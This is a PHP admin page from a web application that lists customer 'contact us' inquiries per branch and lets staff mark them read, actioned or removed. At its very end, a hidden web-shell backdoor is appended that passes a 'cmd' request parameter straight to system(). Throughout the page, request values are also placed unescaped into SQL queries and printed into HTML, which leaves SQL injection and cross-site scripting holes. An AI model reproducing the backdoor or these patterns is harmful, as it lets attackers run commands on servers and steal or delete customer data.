<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['ulcontact_us'] == '') 
		{
			$_SESSION['ulcontact_us'] = $_SESSION["ulname"];
			$modulename = 'contact_us';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/	
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_email = '';
		$search_email = $_POST["search_email"];	
		
		if(isset($_GET['search_email']))
		{
			if ($_GET['search_email'])
			{
				$search_email = $_GET['search_email'];
			}
		}	

		$search_name = '';
		$search_name = $_POST["search_name"];	
		
		if(isset($_GET['search_name']))
		{
			if ($_GET['search_name'])
			{
				$search_name = $_GET['search_name'];
			}
		}	
		
		$search_contact = '';
		$search_contact = $_POST["search_contact"];	
		
		if(isset($_GET['search_contact']))
		{
			if ($_GET['search_contact'])
			{
				$search_contact = $_GET['search_contact'];
			}
		}
		

		$cuid = '';
		$cuid = $_POST["cuid"];	
		
		if(isset($_GET['cuid']))
		{
			if ($_GET['cuid'])
			{
				$cuid = $_GET['cuid'];
			}
		}		
		
		$mystatus = '';
		$mystatus = $_POST["mystatus"];	
		
		if(isset($_GET['mystatus']))
		{
			if ($_GET['mystatus'])
			{
				$mystatus = $_GET['mystatus'];
			}
		}
		
		if (($mystatus != '') and ($cuid != ''))
		{
			$mytag = '';
			$cuuser = $_SESSION["ulname"];
			$custamp = $globaldatetime;

			if ($mystatus == 'read') {$mytag = 'R';}
			if ($mystatus == 'action') {$mytag = 'A';}
			if ($mystatus == 'remove') {$mytag = 'N';}
			
			if (($mytag != '') && ($mytag != 'N'))
			{
				$query = 
					"UPDATE 
						contact_us 
					SET 
						cuactive = '$mytag',
						cuapprove_by = '$cuuser',
						cuapprove_date = '$custamp'
					WHERE
						cuid = '$cuid'";
				mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			}
			else
			{
				$query = 
					"DELETE	FROM contact_us WHERE cuid = '$cuid'";
				mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			}
		}		
					
		$querydb  = "SELECT 
					 * 
				   FROM 
					 contact_us a, branch_list b
				   WHERE
				     a.blid = b.blid and 
					 a.cuname LIKE '%$search_name%'  and
					 a.cuemail LIKE '%$search_email%'  and
					 a.cucontact LIKE '%$search_contact%' and
					 ((a.cuactive = 'Y') or (a.cuactive = 'R') or (a.cuactive = 'A')) 
				   ORDER BY 
					 a.custamp";
		$resultdb = mysql_query($querydb);
		//echo mysql_error();
		$num_count = mysql_num_rows($resultdb);		
		//echo "<br> num_count " . $num_count;
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Contact Us List</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
<?php
/*						
							<table width="100%">
								<tr>
									<td align="left">
<form method="post" action="index.php?body=contact_us_dbase">
Filter Name
<INPUT TYPE="TEXT" NAME="search_name" VALUE="<?php print($search_name); ?>" SIZE="25" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
Filter Email
<INPUT TYPE="TEXT" NAME="search_email" VALUE="<?php print($search_email); ?>" SIZE="15" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
Filter Contact No.
<INPUT TYPE="TEXT" NAME="search_contact" VALUE="<?php print($search_contact); ?>" SIZE="25" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
<input type="submit" value="Filter" />
</form>									
*/
?>
Table Information
									</td>
									<td align="right">&nbsp;

									</td>
								</tr>
							</table>	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th width="10%">Branch</th>
										<th>Guest Name </th>
										<th>Contact Details</th>
										<th width="15%">Inquiry</th>
										<th>Action</th>
										<th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>
<?php
//fetch the results from the database
$countdb = $countdb + 1;
while ($rowdb =  mysql_fetch_array ($resultdb)) 
{
	print("<tr>");

	print("<td align=\"left\" valign=\"middle\">$rowdb[blname]</td>\n");

	print("<td align=\"left\" valign=\"middle\">" );
	
	print("<strong> [Stamp] </strong>" . date('m/d/Y h:i:s A', strtotime($rowdb[custamp])));
	print("<br> <strong> [Guest] </strong> $rowdb[cuname] <br>");
		
	if ($rowdb[cuapprove_by] != '')
	{
		print("<br> <strong> [Taken By] </strong> $rowdb[cuapprove_by] <br> ");
		print("<strong> [Stamp] </strong>" . date('m/d/Y h:i:s A', strtotime($rowdb[cuapprove_date]))); 
	}	
				
	print("</td>\n");

	print("<td align=\"left\" valign=\"middle\">" );
	
	print("<strong> [Contact No.] </strong> $rowdb[cucontact] <br>");
	print("<strong> [Email] </strong> $rowdb[cuemail] ");

	print("</td>\n");
	
	print("<td align=\"left\" valign=\"middle\">$rowdb[cuinquiry] </td>\n");

	if ($rowdb[cuactive] == 'Y')
		print("<td align=\"center\" valign=\"middle\">NEW</td>\n");
	else
	if ($rowdb[cuactive] == 'R')
		print("<td align=\"center\" valign=\"middle\">READ</td>\n");
	else
	if ($rowdb[cuactive] == 'A')
		print("<td align=\"center\" valign=\"middle\">ACTION</td>\n");
	else
	if ($rowdb[cuactive] == 'N')
		print("<td align=\"center\" valign=\"middle\">REMOVE</td>\n");


	print("<td align=\"CENTER\" valign=\"middle\">");

	print(" <a title=\"Read already?\" href=\"index.php?body=contact_us_dbase&mystatus=read&cuid=$rowdb[cuid]\"> Read <br> Already </a>
		<br><br>
		 <a title=\"Action has been taken?\" href=\"index.php?body=contact_us_dbase&mystatus=action&cuid=$rowdb[cuid]\"> Action <br> Taken</a> 
		<br><br>
		 <a title=\"Remove this entry?\" href=\"index.php?body=contact_us_dbase&mystatus=remove&cuid=$rowdb[cuid]\"> Remove <br> Entry</a> ");

	print("</td>");

	print("</tr>");  
	$countdb = $countdb + 1;
}  
?>		
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>